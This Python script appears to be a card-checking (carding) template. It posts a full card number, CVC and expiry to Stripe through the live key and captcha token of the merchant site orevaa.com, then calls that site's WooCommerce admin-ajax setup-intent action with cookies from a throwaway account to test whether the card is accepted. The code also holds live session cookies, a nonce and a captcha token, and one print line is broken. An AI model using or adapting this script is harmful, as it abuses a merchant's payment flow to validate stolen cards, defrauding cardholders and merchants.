import requests

#First Request (payments_methods )
#Copy As Curl And Go To Curl converter and Paste Here


headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

data = 'type=card&card[number]=4147+1814+3876+6671&card[cvc]=700&card[exp_year]=26&card[exp_month]=12&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwNjg2MDA4LCJjZGF0YSI6ImpaRkxRN21aYThJK3lSYWozU28wUXorbUwvcFcraVlWSWtXRVhobUVDTnpvZWNKeTdXTGFDUFpLM2dIazlsMUR1ZzRVRW5xd0lTWVZUVzhITFBYNzFVaUR1NG1XQ2N1bTJQWDlMR2Q0TUVqWVNlak5kZkZwVk5LZHI3T3NnZitmaEFhQVhObGs5ejFmeXVzZEdOYmhJWDZ6ZEJ6VjZMcG5IamlCQzhRUGEvYjJPcHVaUi9jVzRSQUkxNkZLYnZWWnZQQ0F4TjRpYjJBM2FSR0oiLCJwYXNza2V5IjoidUdScjdpVnRRWEVGQm96TE9JMHhJZ2JRWCtnY1luRnJ3bGp2bEc1bWNQYnpGN0EweVFxcEFRRHl1QS9vUGRuVlBQS2VzbkZTR0F4QlNDdzhJQ3BMQkZSRmFxV3R0Qld2Vk9UM05sVDJ2MGNYYWxENVZuSEZqRlFoQ2prdDM2RXhkMnc1VlNoTGVVdnFuNytMVnJ0Z0lpMk5Mc2V5UFp2TnVFK3UycTh5cTZWVnNrQ2ZBWDZDd0pLNTdqbEgyZm5BZitEZ3lVMS93a3o1N1NrbDhPSStkWDlyc2Z5d0VXNFhhOVc4bXFHelpHSWpMTjc4Y3Z6MUZDTkFEU2ZnZjVtQ3BKb05vN29xcER5YnUrUkxrSEFxdWhMc3JGTUh0ZVpJV2FrSGdkMEIweWh0TVVBM29jMHBvR2ZVU2YrZ2QyK2RRamlwYXJZL0swMy93NTJlY2lzQVFMWE0wV1VXYUFWWjIvU1hMZTAvelFjcFI1S2s1MHBsSGpNM0t4SzdQRTFtVlBLWFJaQUl0dHNLaDBCUmY2TjNLb21TK2VWcms0WWdOVms2elA5TlllbVFzcVExK2hBWmNTUnNXR1VuV3pCaEc2SVpkNEs3bG52YVdPWXlmd3RnSDBCYnEvRGgzY0ptbWpoQ0ZEa1FJTlIvMEF2Sms4My82a3ZheE1Jck1vRWpybFFlc2t0c3RDL1lGL1ZndFErNzJGeDluQWFVVUZiK1ZYNlhERTl4QVNnNUZ0UEQ4Mm1WY0djbDRObm1XSS93NnhXaXFPTnZ2bUIvcWsxTC9VZUpER2pNREFZSnFudnlHQTVyeDRKVElmOXpqRFBkTkR5MXdwR0x0RXFLd3g1WXZaT1F3NnhEKy8zQllHNHZpQ0xVTG1RcWZzaTFia05sejVaZ1BRR0MyZktucFpUUjYydlo0MkhHQm02b3RMcDNldFp2eHJhQkhmdUw3Kzh6V1hLT3JsNDE0dTNCcFZnQ2dFZUd5UTJJeUdUd2lYSGxzOTR3T0JFNzdOYVBUWFhwbk1PdTExK21PNGFjTjRWbGhHbldqd2tNZVRtSmJGZCtMY3VyYVN5dU9BbUE5ODlpOUM1cWFtQWRJMjNvT1J4QVkyUGVvWFFPcldIMkZlN0ZXZGhlaUsxR1Q2S25vVzkvQXpkUUphMmVKSnFhQWF5SC8yWEFXMjZncXRLempramVxSlBOdmRBTFQrcXo3SXZJMlpydzR2NTlwMVRWdFA2NTBhVDgzSHBFeHl4NTcvMHVmVXRxRjNpaTVBbThuMTZpVHFoc1pqdVhvbWxwMHVMSmF5Mzl4VWRGdW0wWTV0SmFqSTR4Y2Qvc0lHemlhUUNlSWhEeXBYMGU0OVlZS1VQWGVUUnFDeG5BZ3BJd05YNlBLL0lPZ2NibTN0UU9ETEZLNVFxNDJQVVBnaWdIcGZhUGw5V0ltVWFvQjUvbXptUlR1dWYxRlRyWUsvb3R1WXN2UnVDSXEzOVAyUTBDZ3Nkb3lUU0hJaWVLcHVIcFFIYXJMQlRhcXZxSVc2RUpEQzRybTV3WEwrVkc3UjdzM2lOZ3BHeWFFNS9nTXJrRWE3cTdKWC93RG1SRC9mMGpVWkpzaHhVK05UdWk0YlJ5V0h6Y1N2VWVjNzZDYjl1eS9ONkg5UTFIdnorV2pFZlBTb0kvT0YxdFdrWGFLRW44QjdneGN1YXVqRVI0aXF3QVd3NFNlTVFqYTNqUmZVcjJKVkovVEwwUTZsZHFpeWkxbE1lVU9QRXR4K29KaFZKUXRHaHJucVhMNlNXbzBid05PYlBwSTlIVUpGSWlzWmswUTVJWFFFTERFcnFWZUFjU2pZa1NVVXo3d204MjFiSVQ5UnZNTFpieHQrZ21lbDE2T3BMaDRNUTZOdHFBUndjM0M2TGk1WDRWQ2xta2s5dG9JRHM5OUR5d3lCbnl2eE1TUEU4MGtad2lMb0lZR01XTEVFZ3lub2hOejJHdDk2MklYU3dGVEJpYnBHRi8wVWh4N1J1Ty9PSmpaZlZsVmNHWkVLS2RlUUhKNFdIY1BRRFMxN0hIeElQMFVaUVJJeWxESmhHSGZFenlmeWlVNFg1M2Zmd1RZbXNudTJkNncrQkdMOE1LbExBMHg2MG5VMXlYaHRPRzZZMTcxN1VSOFFkM2o2NnpqVzFIWEhkNnZndlI5VHgveUZmaTZoREVwbU0rc0xpT3RkUTdEcEczdXNMd3M3V0QwcTZXM1U4L2Q5WHNIZ1dXeTNXUXJsSGtiamg1cHFWMWFwTUpxL3ZTNHdvNzI4dHBzaUd0RUtxQjFic09xS0NkdVJMcCtVNWVFQ2VZak11Uk8rZlo4WEYzMU9uRHNuZS82bFIvdVl2NDB5Z1ZRNjNxbHRaZWhPUT0iLCJrciI6IjNlYmMyMmZkIiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.6r36OgB--fPiMUWehkiXe66jiIJy7FYxqFcTmzoqLHE'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

print = (response.json()[id])


#second request (admin ajax )#@diwazz


cookies = {
    'wordpress_sec_13d597ccaacdb3aa9062bb289246a418': 'redekot871%7C1761895155%7CuYzh5MX8EquNm93LxtTu14Q45khSl2FDGPUOIDg1t0s%7C31fb922267a3d843dfea041ae1f84f3f436c732cd435d7bba74c45b3d91b3403',
    'current_cur': 'USD',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-17%2004%3A06%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Forevaa.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-17%2004%3A06%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Forevaa.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'MCPopupClosed': 'yes',
    'mailchimp_user_email': 'riwasa3857%40elygifts.com',
    '__stripe_mid': '2c200dbe-43a4-4a5f-a742-4d870099146696a4b8',
    'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '__stripe_sid': 'a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'mailchimp.cart.previous_email': 'riwasa3857@elygifts.com',
    'mailchimp.cart.current_email': 'redekot871@fixwap.com',
    'wordpress_logged_in_13d597ccaacdb3aa9062bb289246a418': 'redekot871%7C1761895155%7CuYzh5MX8EquNm93LxtTu14Q45khSl2FDGPUOIDg1t0s%7C516ca1e27e45729df61e1f75e302bf300b27fdd151cd2ffcfdafb07dd2b34f70',
    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forevaa.com%2Fmy-account%2Fadd-payment-method%2F',
}

headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://orevaa.com',
    'priority': 'u=1, i',
    'referer': 'https://orevaa.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    # 'cookie': 'wordpress_sec_13d597ccaacdb3aa9062bb289246a418=redekot871%7C1761895155%7CuYzh5MX8EquNm93LxtTu14Q45khSl2FDGPUOIDg1t0s%7C31fb922267a3d843dfea041ae1f84f3f436c732cd435d7bba74c45b3d91b3403; current_cur=USD; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-10-17%2004%3A06%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Forevaa.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-10-17%2004%3A06%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Forevaa.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; MCPopupClosed=yes; mailchimp_user_email=riwasa3857%40elygifts.com; __stripe_mid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36; __stripe_sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de; wordpress_test_cookie=WP%20Cookie%20check; mailchimp.cart.previous_email=riwasa3857@elygifts.com; mailchimp.cart.current_email=redekot871@fixwap.com; wordpress_logged_in_13d597ccaacdb3aa9062bb289246a418=redekot871%7C1761895155%7CuYzh5MX8EquNm93LxtTu14Q45khSl2FDGPUOIDg1t0s%7C516ca1e27e45729df61e1f75e302bf300b27fdd151cd2ffcfdafb07dd2b34f70; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forevaa.com%2Fmy-account%2Fadd-payment-method%2F',
}

data = {
    'action': 'wc_stripe_create_and_confirm_setup_intent',
    'wc-stripe-payment-method': 'pm_1SJ81tH4BTbwSDwzbyzF8jro',
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '1fa2a1e107',
}

response = requests.post('https://orevaa.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

print(response.json())